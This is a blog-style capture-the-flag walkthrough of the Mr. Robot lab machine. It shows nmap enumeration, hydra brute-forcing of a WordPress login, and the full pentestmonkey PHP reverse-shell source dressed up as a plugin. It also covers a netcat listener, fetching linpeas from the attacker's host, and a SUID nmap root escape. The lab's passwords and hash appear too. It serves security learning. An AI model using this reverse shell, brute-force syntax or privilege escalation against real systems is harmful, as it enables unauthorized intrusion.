---
title: Mr. Robot CTF - TryHackMe
date: 2020/07/09
categories:
  - pentesting
  - writeups
---

Hey there! Today I am going to walk you through the Mr. Robot machine. I used the one on [TryHackMe](https://tryhackme.com/room/mrrobot), but it is available on [Vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/) as well.

The first thing I always do (thanks to John Hammond) is to export the IP to a global variable. So \$IP will refer to the target machine from now on.

```bash
export IP={Machine IP}
```

## Enumeration

Let us start our enumeration as usual and do an nmap scan:

```bash
nmap -sC -sV -oN nmap/initial $IP
```

This is what we are working with:

```plain
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 11:13 EDT
Nmap scan report for 10.10.99.113
Host is up (0.046s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.08 seconds
```

We can see that there is a webserver up but there is nothing interesting at first glance, just some stuff about the Mr. Robot series.<br/>Let’s run a dirbuster scan anyways.

### Flag 1

Also let’s have a look at the robots.txt file, as the hint for the first key is “robots”.

```plain
# robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

That seems interesting. We have the first key and we should probably also download the dictionary file. Maybe we will need it later.

## Gaining Access

Meanwhile, our dirbuster results should have come back. We can see a lot of folders and files relating to a WordPress installation probably for a blog. Especially interesting is the “wp-login.php” file in the root of the webserver. Maybe we can get in that way with the credentials we downloaded earlier? Let us try that.<br/>I used hydra with the following syntax:

```bash
hydra -L fsocity.dic -p test $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```

Basically what we are doing is, we are trying to get the username from the .dic file. Luckily with WordPress, we can see whether the password or the username was wrong, so we first bruteforce the username and then the corresponding password.<br/>We are also telling hydra in which post parameter to insert the username and password. You can get the post parameters through burp suite.

```plain
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-08 11:20:46
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://$IP:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:F=Invalid username
[80][http-post-form] host: $IP  login: Elliot   password: test
```

Sweet! Now we got the user: **Elliot**

Next, let us try to get the password!

```bash
hydra -l Elliot -P fsocity.dic $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:S=302"
```

We are using the same syntax as before but using “Elliot” as the username and the .dic file as a wordlist for the password.

```plain
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-08 11:22:21
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
[DATA] attacking http-post-form://$IP:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2F&testcookie=1:S=302
[...]
[80][http-post-form] host: $IP   login: Elliot   password: ER28-0652
```

Great! Now with the password (**ER28-0652**), it should be no problem to log in.

Once logged in we are greeted with the standard WordPress dashboard. Nothing has been done here, so it is quite empty. After looking around a bit I noticed that I could upload plugins. So why shouldn’t we upload our own special plugin 😅?

I just used the standard [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from pentestmonkey and modified it to my needs.

```php
<?php
/*
Plugin Name:  Shelldon
Plugin URI: http://example.com
Description: Makes a Shelldon
Version: 1.0
Author: me
Author URI: http://www.me.com
Text Domain: revshell
Domain Path: /languages
*/
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '';  // Your tun0 ip (ifconfig in terminal)
$port = 9999;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

We need this part at the top:

```php
/*
Plugin Name:  Shelldon
Plugin URI: http://example.com
Description: Makes a Shelldon
Version: 1.0
Author: me
Author URI: http://www.me.com
Text Domain: revshell
Domain Path: /languages
*/
```

I honestly don’t know what it does exactly but it makes it look like a WordPress plugin and only that way we can upload it.

So let’s do just that, upload our plugin, but don’t activate it yet. Before that, we have to listen for incoming connections with netcat on our machine.

```bash
nc -lnvp 9999
```

Now if we activate the plugin in the WordPress interface, the page should be stuck in a loading loop, and we should have a reverse shell in the terminal we started the netcat listener in.

This shell is not really stable and we can’t use our arrows or autocomplete, so I am going to be using some poor man’s pentest and use the stabilizeshell.sh script. (If you don’t know what I am talking about, check out this video [here](https://www.youtube.com/watch?v=f2aSXGbD0NE))<br/>That way we can use all the nice features of a shell.

## Post Exploitation

### Flag 2

With the new shell we can also easily see that we are connected as the “daemon” user, so let’s see if we have some home directories.

```bash
daemon@linux:/$ cd home/
daemon@linux:/home$ ls
robot
daemon@linux:/home$ cd robot/
daemon@linux:/home/robot$ ls
key-2-of-3.txt	password.raw-md5
```

We can see that there is another user called “robot” on this machine and he has a home. In there he has to files. A key, which we can sadly not cat out because it is owned by “robot”. So we do not have access to it. But there is something else interesting.<br/>An md5 hash of a password, which we luckily can cat out.

```bash
daemon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

I was too lazy to do anything fancy in hashcat or john, so I just used [crackstation.net](https://crackstation.net/), it gives us the result way faster:

{% asset_img crackstation.png %}

Now that we have his credentials, let’s login as “robot”

```bash
su robot
```

(And of course type in the password we just found)

Cool, we are now “robot”, means that we now have access to the second key.

```bash
daemon@linux:/home/robot$ cat key-2-of-3.txt
key2
```

## Getting Root

Now that we have a user with more privileges we should try and get ourselves root. For that, I got [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) on the target machine.<br/>I did that by using my machine as a server and downloading linpeas from my machine. (You could also just directly download linpeas to be honest but I did it that way)

To open up the server (Do that on **your** computer):

```python
python3 -m http.server
```

Download files (Do that on the **target** machine):

```bash
cd /dev/shm/
wget "$YOURIP:8000/linpeas.sh"
```

(\$YOURIP is your tun0 ip that shows up if you run ifconfig)

Now mark linpeas.sh as an executable

```bash
chmod +x linpeas.sh
```

And run and save it

```bash
./linpeas.sh | tee linout.txt
```

As usual, linpeas found a shitload of things but something that stood out to me was the “nmap” entry in the SUID section.

A quick search on [GTFOBins](https://gtfobins.github.io/) shows us that a root shell is just a few lines of code away.

{% asset_img gtfobins.png %}

I used the second option, so spawn an interactive nmap shell and get a root shell.

```plain
nmap --interactive
nmap> !sh
```

And there you go, you have a root shell! I didn’t stabilize it this time, just because we don’t work in it very long.

### Flag 3

Now we can have a look inside of the /root/ directory and we see the third key.

```plain
# whoami
root
# pwd
/root/
# cat key-3-of-3.txt
key3
```

## The End

And there you have it! I hope you had fun, I know I did 🦄
